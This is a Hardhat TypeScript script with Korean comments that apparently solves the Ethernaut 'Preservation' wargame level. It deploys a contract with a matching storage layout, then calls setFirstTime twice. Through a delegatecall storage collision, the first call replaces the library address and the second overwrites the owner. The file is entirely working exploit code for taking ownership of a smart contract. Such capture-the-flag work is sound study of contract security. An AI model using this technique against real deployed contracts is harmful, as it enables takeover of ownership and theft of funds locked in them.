import { ethers } from "hardhat";
import fs from "fs";
import path from "path";
import { formatEther } from "ethers";

async function main() {
  // get contract by address & abi
  const instanceAddress = "0x93ceAfb886A28B24686f0a6cbDFc33Ab83822A45";

  const abiPath = path.join(__dirname, "..", "abis", "preservation.json");
  if (!fs.existsSync(abiPath)) {
    console.error(`ABI file not found at ${abiPath}`);
    process.exit(1);
  }
  const abiJson = JSON.parse(fs.readFileSync(abiPath, "utf8"));

  const [signer] = await ethers.getSigners();

  const contract = new ethers.Contract(instanceAddress, abiJson, signer);
  console.log("Attached to contract:", contract.target);

  // function call
  console.log("owner:", await contract.owner());

  // 1. slot layout을 Preservation과 동일하게 맞춘 attack 컨트랙트 배포
  const attackContract = await ethers.getContractFactory("PreservationAttack");
  const attack = await attackContract.deploy();
  await attack.waitForDeployment();
  const attackAddress = await attack.getAddress();
  console.log("Attack contract:", attackAddress);

  // 2. attack 의 주소를 매개변수로
  // LibraryContract 에 delgateCall 이 날라가면서
  // LibraryContract 의 slot 0 변경을 실행하기 때문에
  // Preservation 의 slot 0 인 timeZone1Library 가 attack 주소로 변경됨
  const tx1 = await contract.setFirstTime(attackAddress);
  tx1.wait();

  // 3. 다시 실행하면 attack 컨트랙트로 delegateCall 이 날라옴
  // 동일한 slot 2 인 owner 를 변경
  const tx2 = await contract.setFirstTime(1);
  tx2.wait();

  console.log("new owner:", await contract.owner());
}

main().catch((err) => {
  console.error("Error:", err);
  process.exitCode = 1;
});
